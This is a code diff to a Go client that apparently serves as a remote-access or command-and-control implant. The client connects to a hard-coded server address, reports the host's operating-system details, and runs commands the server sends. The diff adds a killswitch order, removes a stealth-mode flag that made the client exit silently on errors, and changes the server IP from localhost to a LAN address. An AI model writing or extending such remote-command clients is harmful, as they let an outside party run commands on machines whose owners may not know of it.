@@ -24,9 +24,10 @@ type Client struct {
 }
 
 type Instructions struct {
-	IsHeartbeat bool
-	IsCommand   bool
-	Message     string
+	IsHeartbeat  bool
+	IsCommand    bool
+	IsKillswitch bool
+	Message      string
 }
 
 type Response struct {
@@ -35,35 +36,22 @@ type Response struct {
 }
 
 var (
-	StealthMode bool = false
-	RemoteIP         = "127.0.0.1"
-	RemotePort       = "1302"
+	RemoteIP   = "192.168.1.181"
+	RemotePort = "1302"
 )
 
 func main() {
 	conn, err := net.Dial("tcp", RemoteIP+":"+RemotePort)
 	if err != nil {
-		if StealthMode == true {
-			os.Exit(0)
-		} else {
-			log.Fatalf("Error happened connecting to server: %v\n", err)
-		}
+		log.Fatalf("Error happened connecting to server: %v\n", err)
 	}
 	defer conn.Close()
 	if err := sendOSInfo(conn); err != nil {
-		if StealthMode == true {
-			os.Exit(0)
-		} else {
-			log.Fatal(err)
-		}
+		log.Fatal(err)
 	}
 	for {
 		if err := awaitInstructions(conn); err != nil {
-			if StealthMode == true {
-				os.Exit(0)
-			} else {
-				log.Fatalf("Error happened awaiting instructions: %v\n", err)
-			}
+			log.Fatalf("Error happened awaiting instructions: %v\n", err)
 		}
 	}
 }
@@ -138,6 +126,8 @@ func awaitInstructions(conn net.Conn) error {
 	case inst.IsCommand == true:
 		executeCommand(conn, inst.Message)
 	///////////////////////////////
+	case inst.IsKillswitch == true:
+		os.Exit(0)
 	default:
 		sendMessage(Response{Successful: false, Message: "Unknown order!"}, conn)
 	}
